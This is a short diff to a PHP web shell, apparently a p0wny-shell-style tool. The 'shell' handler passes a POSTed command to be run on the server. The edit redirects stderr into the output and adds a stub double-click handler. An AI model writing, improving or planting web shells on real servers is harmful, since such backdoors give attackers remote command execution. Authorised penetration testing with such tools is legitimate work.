@@ -30,7 +30,11 @@ if (isset($_GET["feature"])) {
 
     switch ($_GET["feature"]) {
         case "shell":
-            $response = featureShell($_POST["cmd"], $_POST["cwd"]);
+            $cmd = $_POST['cmd'];
+            if (!preg_match('/2>/', $cmd)) {
+                $cmd .= ' 2>&1';
+            }
+            $response = featureShell($cmd, $_POST["cwd"]);
             break;
         case "pwd":
             $response = featurePwd();
@@ -277,6 +281,12 @@ if (isset($_GET["feature"])) {
                 updateCwd();
                 eShellCmdInput.focus();
             };
+
+            function ondblclick1(e) {
+                console.log('on dbl click');
+                e.preventDefault();
+                e.stopPropagation();
+            }
         </script>
     </head>
 
